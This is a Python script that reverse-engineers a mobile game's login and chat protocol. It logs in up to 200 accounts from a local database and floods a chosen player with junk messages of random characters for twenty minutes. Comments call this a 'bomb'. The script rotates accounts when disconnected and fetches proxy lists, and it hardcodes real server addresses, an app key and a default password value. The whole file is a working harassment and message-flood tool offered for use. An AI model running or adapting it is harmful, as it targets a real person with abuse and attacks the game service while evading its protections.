#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import asyncio
import socket
import sqlite3
import json
import sys
import os

import aiohttp
import requests

import socks
from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, make_bad_msg_data, Session

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
}
# socket.socket = socks.socksocket

def get_proxies2():
    proxies = requests.get("https://proxy.ishield.cn/?types=0&count={}".format(300)).json()
    proxies += requests.get("https://proxy.ishield.cn/?types=1&count={}".format(300)).json()
    return set("{} {}".format(proxy[0], proxy[1]) for proxy in proxies)

async def user_do(username, imei, passwd='V0\/wJekk6Kk=', proxy=None):
    # return user_id and session for login_verify api
    version = 'Android1.0.1'
    tpl = '{"uid":"","token":"","uName":"%s","nickName":"","password":"%s","version":"%s","imei":"%s","authCode":"","flag":1,"isfast":"0","thirdType":1,"thirdToken":"","thirdUid":"","fbBusinessToken":"","language":"Cn","appKey":"76749c0621384a96b744ccb089567bcf"}'
    j = tpl % (username, passwd, version, imei)
    url = 'http://haiwaitest.3333.cn:8008/sdk/user/user.do'
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=j, headers=headers, proxy=proxy, timeout=3) as resp:
            t = await resp.text()
            r = json.loads(t)
            assert r["code"] == 100
    return r['uid'], r['token']

async def login_verify(user_id, token, version='1.6.61095', proxy=None):
    # return tcp session
    url = 'http://sgz-login.fingerfunol.com:30006/entry_server/login_verify?version=%s&server_id=20&userid=%s&channel=4&session=%s&platform=a8card&isdebug=False&activation_code=' % (version, user_id, token)
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
            t = await resp.text()
            r = json.loads(t)
    return r['session']

def char_gen():
    blocks = [15708544, 15708800, 15709056, 15709312]
    random.shuffle(blocks)
    char = random.randint(blocks[0], blocks[0] + 63).to_bytes(3, byteorder="big")
    return char

async def one(email, targets, wait=0):
    """maintance one bomb sender"""
    proxies = get_proxies()
    imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
    version = "1.6.61095"
    uid, token, session = None, None, None
    # session_manager = Session(email)
    while True:
        print("start:", email)
        #random.shuffle(proxies)
        #host, port = proxies[0]
        #http_proxy = "http://{}:{}".format(host, port)
        http_proxy = None
        try:
            try:
                raise
                uid, token, session = session_manager.get_session(email)
                print("got session for", email)
                login_type = "from sqlite"
            except:
                if wait:
                    await asyncio.sleep(wait)
                    wait = 0
                uid, token = await user_do(email, imei)
                session = await login_verify(uid, token, version=version)
                # session_manager.update_session(email, uid, token, session)
                login_type = "from http"

#            socks.set_default_proxy(socks.HTTP, host, int(port))
            fut = asyncio.open_connection('128.14.230.246', 30000)
            reader, writer = await asyncio.wait_for(fut, timeout=3)
            writer.write(make_logon_data(version, uid, imei, session))
            head = await reader.read(4)
            if head == b"":
                print("fail to connect with type:", login_type)
                # session_manager.delete_session(email)
                continue
            body_len = int.from_bytes(head, byteorder="big")
            body = b""
            while len(body) < body_len:
                body += await reader.read(body_len - len(body))
            writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')    # seems like 2 cmd, each len is 7, read on screen players?  00 00 00 00 00 00 05 an
            head = await reader.read(4)
            body_len = int.from_bytes(head, byteorder="big")
            body = b""
            while len(body) < body_len:
                body += await reader.read(body_len - len(body))
            writer.write(b'\x00\x00\x00\x02\x01\x00')  # heartbeat?
            await asyncio.sleep(3)
            #print("get body len", body_len, ":", body)
            #print("---------------do something----------------")
            #receiver = 353956
            i = 0
            print("bomb start------->>>>>>>")
            while True:
                for receiver in targets:
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 5))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 7))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
                    await asyncio.sleep(0.5)
                    i += 1
                    if i % 20 == 0:
                        writer.write(b'\x00\x00\x00\x02\x01\x00')
                    await reader.read(1024)
                    #if i % 30 == 0:
                    #    # read packages and do nothing
                    #    head = await reader.read(4)
                    #    body_len = int.from_bytes(head, byteorder="big")
                    #    body = b""
                    #    while len(body) < body_len:
                    #        body += await reader.read(body_len - len(body))
                # rd = lambda : random.randint(0,255).to_bytes(1, byteorder='big')
                # writer.write(b"\x00\x00\x00\x0e\x01\x01\xf0\x7b\x05" + rd() + rd() + rd() + rd() + rd() + rd() + rd() + rd() + b"\x42")
        except BrokenPipeError:
            import traceback
            print(traceback.format_exc())
            print(email, "disconnected after", i, "turns")
            conn = sqlite3.connect("data.db")
            conn.isolation_level = None   # auto commit
            c = conn.cursor()
            c.execute("SELECT email FROM guards ORDER BY RANDOM() LIMIT 1")
            email = c.fetchone()[0]
            print("change to:", email)
            await asyncio.sleep(random.randint(60,120))
            # session_manager.delete_session(email)
            # uid = token = session = None
        except:
            import traceback
            print("wtf!!!!", traceback.format_exc())
            os.system("echo {} >> bugaccount.txt".format(email))
            await asyncio.sleep(random.randint(20,60))


async def count_down(sec):
    await asyncio.sleep(sec)
    exit()

if __name__ == "__main__":
    print(sys.argv)
    seconds = 1200
    target = sys.argv[1]
    loop = asyncio.get_event_loop()
    guards = []
    conn = sqlite3.connect("data.db")
    conn.isolation_level = None   # auto commit
    c = conn.cursor()
    c.execute("SELECT role_id from all_players where name = ?", (target, ))
    targets = c.fetchone()
    print(targets, target)
    c.execute("SELECT * FROM guards ORDER BY RANDOM() LIMIT 200")
    idx = 0
    for row in c.fetchall():
        idx += 1
        guards.append(one(row[0], targets, idx%40))
    loop.run_until_complete(asyncio.gather(*guards, count_down(seconds+40)))
    loop.close()
